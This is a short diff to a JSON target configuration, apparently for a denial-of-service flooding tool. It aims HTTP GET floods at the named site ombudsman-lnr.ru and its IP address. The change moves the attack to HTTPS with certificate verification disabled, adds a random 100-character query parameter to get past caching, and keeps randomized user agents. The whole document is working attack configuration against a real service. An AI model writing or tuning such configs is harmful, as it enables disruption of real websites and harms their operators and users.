@@ -5062,12 +5062,15 @@
       "type": "packetgen",
       "name": "ombudsman-lnr.ru",
       "args": {
-        "dynamic": false,
+        "dynamic": true,
         "connection": {
           "type": "net",
           "args": {
             "protocol": "tcp",
-            "address": "193.228.162.15:80"
+            "address": "193.228.162.154:443",
+            "tls_config": {
+              "insecure_skip_verify": true
+            }
           }
         },
         "packet": {
@@ -5075,7 +5078,7 @@
             "type": "http",
             "data": {
               "method": "GET",
-              "path": "http://ombudsman-lnr.ru",
+              "path": "https://ombudsman-lnr.ru/classifier/ktru-list/?v={{ random_alphanum 100 }}",
               "headers": {
                 "User-Agent": "{{ random_user_agent }}"
               }
